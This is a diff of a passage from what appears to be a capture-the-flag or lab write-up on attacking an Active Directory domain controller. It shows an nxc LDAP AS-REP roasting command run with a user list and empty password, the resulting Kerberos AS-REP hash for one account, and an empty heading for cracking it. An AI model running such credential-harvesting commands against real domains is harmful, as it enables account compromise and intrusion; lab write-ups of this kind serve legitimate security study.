@@ -138,4 +138,18 @@ I am able to use null auth to dump users but not able to list shares
 
 The guest account is disabled
 
-# AS-REP o
+# AS-REP roasting leads to user compromised
+
+```python
+nxc ldap dc01.shadow.gate -u users.txt -p '' --asreproast asrep.hash             
+LDAP        10.1.130.196    389    DC01             [*] Windows Server 2022 Build 20348 (name:DC01) (domain:shadow.gate) (signing:None) (channel binding:Never) 
+[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
+[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
+LDAP        10.1.130.196    389    DC01             $krb5asrep$23$jtrueblood@SHADOW.GATE:eaa351956f6d85d764b2bb1dc7829e68$d77aa89f900cdbe3580df5fcb6c7de8528ee114d5025e47cbf4a347833b9ba86e53e653fa9c39926f99d8e66693c19ff5d4d1b7a874431dd7960ec88fc43fb1b7178c920cc90806dced395f5276d137d9b76fb2bcdb2770b45ac46d4ecf13b39dec451afa97e38c3be9b59ef97d824cd2e1890129bba190b04b72e9c345cee041dedcaf6a75c102a3f38a639641bb0b0128ff2814dba990b6e045db85b67609248567ef143697a563b20f1314ce698ae4a4ea4f217671ca50471d5b5dda5ba39a896e376c6cc32d7951dac528a2983a6098e11e61b70cdb7d9ef315288d83d8006a950e6e41432f75e98
+```
+Found a hash for a user account
+
+## Cracking the hash
+```python
+
+```
